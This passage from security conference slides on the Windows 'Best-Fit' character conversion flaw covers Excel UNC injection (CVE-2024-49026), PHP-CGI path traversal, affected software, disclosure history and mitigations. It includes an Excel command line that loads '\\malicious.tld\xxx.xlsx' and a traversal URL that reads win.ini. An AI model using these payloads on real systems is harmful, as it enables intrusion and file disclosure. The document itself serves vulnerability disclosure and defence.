GZ Event &8 Process $ Stack
Image
| Notepad
Microsoft Corporation
Name: NOTEPAD.EXE
Version: 10.0.19041.1 (WinBuild.160101.0800)
Path:
| C\WINDOWS\system32\NOTEPAD.EXE
NOTEPAD . EXE <FILENAME>
Command Line:
| “C:\WINDOWS\system32\NOTEPAD.EXE" C:\New Text Document.txt \
```

## Slide 101

**New Microsoft Excel Worksheet.xlsx**

## Slide 102

**AAAA** ＂ ＂／ **a** ＂ ＂ ＼＼ **malicious.tld** ＼ **xxx.xlsx**

## Slide 103

EXCEL.exe " **AA** " " **/a** " " **\\malicious.tld\xxx.xlsx** "

## Slide 104

**CVE-2024-49026 - Microsoft Excel Inject UNC to RCE**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
CVE-2024-49026 - Microsoft Excel Inject UNC to RCE
Harmless Excel ;)
```

## Slide 105

**CVE-2024-49026 - Microsoft Excel Inject UNC to RCE**

#### **MotW / Protected-View won’t help you** **__**

## Slide 106

#### Attack Surfaces

**Path / File name**

**Environment Variable**

**Command Line**

Windows  Active
Registry Directory

## Slide 107

#### CGI

Stdin
Web Server CGI
Stdout
Environment Variables
Query string, path, headers etc.

## Slide 108

#### CGI

ReadConsoleInputA
Bestf i t!
Stdin ANSI
Web Server CGI
Stdout
Environment Variables
Query string, path, headers etc.
Bestf i t!
GetEnvironmentVariableA

## Slide 109

**Browser**

/index.php/ **%E0** dmin

**Web Server** Block access to /admin

**CGI**

PATH_INFO=/index.php/ **à** dmin

$_SERVER['PATH_INFO'] GetEnvironmentVariableA("PATH_INFO")

## Slide 110

**Browser** /index.php/ **%E0** dmin **Web Server** Block access to /admin PATH_INFO=/index.php/ **à** dmin

**CGI** PATH_INFO=/index.php/ **<u>a</u>** <u>dmin</u> **Bestf i** **t!**

## Slide 111

#### PHP w/ CGI-Mode

http://victim.tld **/index.php/foo/bar**

~~ENV~~ REDIRECT_URL = /index.php/foo/bar REQUEST_URI = /index.php/foo/bar Server PATH_INFO = /index.php/foo/bar PATH_TRANSLATED = C:\www\index.php\foo\bar SCRIPT_FILENAME = C:\www\index.php php-cgi.exe PATH_INFO = /foo/bar

## Slide 112

PHP w/ CGI-Mode

http://victim.tld **/index.php/foo/bar**

~~ENV~~ REDIRECT_URL = /index.php/foo/bar REQUEST_URI = /index.php/foo/bar Server PATH_INFO = /index.php/foo/bar PATH_TRANSLATED = C:\www\index.php\foo\bar ~~_ _ split by PHP-CGI.exe~~ SCRIPT_FILENAME = C:\www\index.php php-cgi.exe PATH_INFO = /foo/bar

## Slide 113

#### PHP w/ CGI-Mode

http://victim.tld **/index.php/../../secret**

ENV
REDIRECT_URL = /index.php/../../secret
REQUEST_URI = /index.php/../../secret
Server
PATH_INFO = /index.php/../../secret
PATH_TRANSLATED = C:\secret
SCRIPT_FILENAME = C:\secret
php-cgi.exe
PATH_INFO = /

## Slide 114

#### PHP w/ CGI-Mode

http://victim.tld **/index.php/../../secret**

Validate Server

¯\_(ツ)_/¯

**Invalid URI Path 400 Bad Request**

## Slide 115

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
77 Ah shit, here we go again.
```

## Slide 116

#### PHP w/ CGI-Mode

http://victim.tld/index.php/..¥..¥secret/foo/ php-cgi.exe **Bestfit!** PATH_TRANSLATED = C:\www\index.php\..\..\secret/foo PATH_INFO = /index.php/..\..\secret/foo ENV Split and get the PHP file and PATH_INFO

## Slide 117

#### Apache + PHP-CGI

###### For a non-existing file

http://victim.tld/index.php/..¥..¥ NONEXIST/

Render index.php

For an existing file

http://victim.tld/index.php/..¥..¥ windows/win.ini/

No input file specified error

## Slide 118

With IIS + PHP-CGI + <u>doc_root configured</u> It Can Become **LFI** !

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
With IIS + PHP-CGI + doc_root configured
It Can Become LF!
< GS A Notsecure | victim.tld/index.php/..¥..¥..¥..¥..¥Windows/win.ini/foo LW v= ee ~~
; for 16-bit app support [fonts] [extensions] [mci extensions] [files] [Mail] MAPI=1
```

## Slide 119

#### Perl CGI

#### PHP w/ CGI Mode

   - $_REQUEST, $_GET

- Query, Path, Headers … All affected!

- $_SERVER

   - ORIG_PATH_INFO

   - ORIG_PATH_TRANSLATED

   - PATH_INFO

   - PATH_TRANSLATED

   - PHP_SELF

## Slide 120

- All Code Pages lead to Path Traversal (on IIS) - 874: Thai

- - 1250: Latin 2 / Central European

- - 1251: Cyrillic U+FF3C

- - 1252: Latin 1 / Western European

- - 1253: Greek

- - 1254: Turkish ＼

- - 1255: Hebrew

- - Full Width 1256: Arabic Reverse Solidus

- - 1257: Baltic

- - 1258: Vietnamese

## Slide 121

#### Attack Surfaces

**Path / File name Command Line** **RegOpenKeyA RegQueryValueA Windows Active Environment Variable … Registry Directory**

Future work!

## Slide 122

#### We found many such bugs!

- PHP

   - Microsoft Excel

- Java

   - OpenSSL

- Perl

   - Subversion (SVN)

- tar (Windows built-in)

   - Perforce

- curl (Author build)

   - PostgreSQL

- wget

   - Plink on Putty

- Bzip2

- XZ Utils

## Slide 123

We found many such bugs!

   - PHP ● Microsoft Excel

   - ● Java ● OpenSSL

- Perl ●

- **Why do so many OSS projects get it wrong?** Subversion (SVN) ● tar (Windows built-in) ● Perforce ● ● curl (Author build) PostgreSQL

- ● ● wget Plink on Putty

- ● Bzip2 ● XZ Utils

## Slide 124

int main(int argc, char* argv[]) { }

A normal main function for *NIX system…

## Slide 125

int main(int argc, char* argv[]) { }

But on Windows is **vulnerable** by default !

## Slide 126

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
\ - HelloWorld.exe C:\Users\Orange\source\rep< Le
Edit Jump Search View Debugger Lum
1: @vy Er: aA [Aly : fa] @
ibrary function {J Regular function §§§ Instruction
ae)
—
IDA View-A =) |
int __fastcall| main( ant <
{
printf( "Hello World! \n'
_ return @;
}
Synchronize with
Copy
Remove return value
Rename global item...
Set item type...
Jump to xref...
Edit func comment...
Generate HTML...
Mark as decompiled
Copy to assembly
Hide casts
Remove return type
De-obfuscate arithmetic expressions
Gepetto
Ctrl+C
Shift+L
N
Y
X
/
Cie
```

## Slide 127

**Your** **main() is here**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
38 _scrt_current_native_startup_ state = initialized;
39° «+}
40 _scrt_release_startup_lock(v@);
41 dyn_tls_init_callback = (_QWORD *) scrt_get_dyn_tls_init_callback(v3);
42 v6 = (void (__fastcall **)(_QWORD, __int64))dyn_tls_init_callback;
43 if ( *dyn_tls_init_callback && _scrt_is_nonwritable_in_current_image(dyn_tls_ init_
44 (*v6)(@LL, 2LL);
45 dyn_tls_dtor_callback = (_tls_callback_type *) scrt_get_dyn_tls_dtor_callback(v5);
46 v8 = dyn_tls_dtor_callback;
47 if ( *dyn_tls_dtor_callback && _scrt_is_nonwritable_in_current_image(dyn_tls_dtor_
48 register_thread_local_exe_atexit_callback_@(*v8);
49 envp = get_initial_narrow_environment_@();
50 argv = *_p__argv_@(); ; H
Al oS eee en. Your main() is here
52 ve main(yarecs argv, envp);
53] if Tscrt_is_managed_app() )
54 LABEL_20:
55 exit_0(v@);
```

## Slide 128

**Who put the code behind you?**

**Your** **main() is here**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
38
39
40
41
42
A2R
47
48
49
50
51
52
aS
54 LABEL_20:
33
_scrt_current_native_startup_ state = initialized;
}
_scrt_release startup_lock(v@);
dyn_tls_init_callback = (_QWORD *) scrt_get_dyn_tls_init_callback(v3);
v6 = (void (__fastcall **)(_QWORD, __int64))dyn_tls_init_callback;
Gf fF ¥Fdvn t1e init callhack Q2 ecrt ic nanuwritahla in currant imaaaldun tle init
if ( *dyn_tls_dtor_callback && _scrt_is_nonwritable in_current_ima
register_thread_local_exe_atexit_callback_@(*v8);
envp get_initial_narrow_environment_@();
argv = *_p___argv_@();
talis Geer
arg¢—=—p_argc_0();
ve 4 main(yarecs argv, envp);
if T scrt_is_managed_app() )
exit_@(ve);
```

## Slide 129

**Your main() are here**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
B= Microsoft
Visual Studio
Best-in-class tools for any developer
Visual Studio Visual Studio Code ~ Visual Studio for Mac
OG File Edit View Project Bulld Debug Test Analyze
e Pm 0 Smartes
SmartHote1360.Pu
```

## Slide 130

_scrt_common_main()
GetCommandLineA ()
__scrt_initialize_crt()
__acrt_initialize_command_line()
</> mainCRTStartup
pre_c_initialization()
parse_command_line() configure_narrow_argv<char>()
__p___argv()
int main(int argc,  char* argv[] ) { }

## Slide 131

The **safer** way: Use the wide-char version

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
The wmain function signature
The wmain function doesn't have a declaration, because it's built into the language. If it did, the
declaration syntax for wmain would look like this:
G fh) Copy
int wmain( void );
int wmain( int argc, wchar_t *argv[ ] );
int wmain( int argc, wchar_t *argv[ ], wchar_t *envp[ ] );
The safer way: Use the wide-char version
```

## Slide 132

#### Those standard libc functions are also vulnerable!

 Safe  Potentially Vulnerable
_wgetenv getenv
_wgetcwd getcwd, _getcwd
wscanf scanf
...

## Slide 133

## Slide 134

#### Our eforts on reporting to MSRC f

|**Date**|**Action**|**Result**|
|---|---|---|
|2024/06/13|Report the Tar issue to MSRC as VULN-127777|Closed|
|2024/06/19|Report the███issue to MSRC as VULN-1288124|Closed|
|2024/06/19|Report the Excel issue to MSRC as VULN-128122|Closed|
|2024/06/21|Report the Excel issue to MSRC as VULN-128235|Closed|
|2024/07/14|Report the Excel issue to MSRC as VULN-130207|Accept|
|2024/08/15|Report the Tar issue to MSRC through the help of CERT/CC|No Response|
|2024/11/13|Notify Microsoft that we will present Tar issue at Black Hat Europe|No Response|

## Slide 135

Responses from OSS maintainers

## Slide 136

This is a Windows feature [...] **Curl is a victim here** , not the responsible party.

─ Author of Curl

https://hackerone.com/reports/2550951

## Slide 137

This **seems more like a Microsoft bug** than a perl bug…

─ Perl

## Slide 138

This is **not a PostgreSQL vulnerability** .

─ PostgreSQL

## Slide 139

**_** **@Microsoft _** folks, do you see a better way forward here, given the Windows API?

─ PostgreSQL

## Slide 140

_
@Microsoft _ folks, do you see a better way
forward here, given the Windows API?
─
PostgreSQL maintainer

## Slide 141

We are collaborating with **CERT/CC**

Hope the world could be safer!

## Slide 142

#### Summary of Attack Surfaces

(CVE-2024-4577)
Re-enable Argument
Filename Smuggling Argument splitting CGI
injection
125X, Thai
 (English, Spanish, French, Dutch,
Arabic, Russian, Portuguese,
German, Italian, Turkish, Polish,
Ukrainian, Greek, Czech, Swedish,  (Greek  )
Vietnamese)
Korean
Japanese
Chinese

It's possible but with certain limitations

## Slide 143

https:// **Worst.Fit** /

## Slide 144

#### Temporary Mitigations

- As an User

   - Switch your language to UTF-8

- As a Developer

   - Use WideChar Windows API as much as possible!

## Slide 145

#### Takeaways!

- Windows ANSI API contains a hidden trap leading to security bugs

- NO, you should not port *NIX program to Windows directly

- Implicitly character transformer can always be a security issue

## Slide 146

#### Special Thanks

- Jonathan Leitschuh

- Vijay Sarvepalli from CERT/CC

## Slide 147

## Thanks!

research@devco.re @orange_8361 @_splitline_

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
DEVCORE
Thanks!
WA research@Qdevco.re
NX @orange_8361
X @-_soplitline_
```
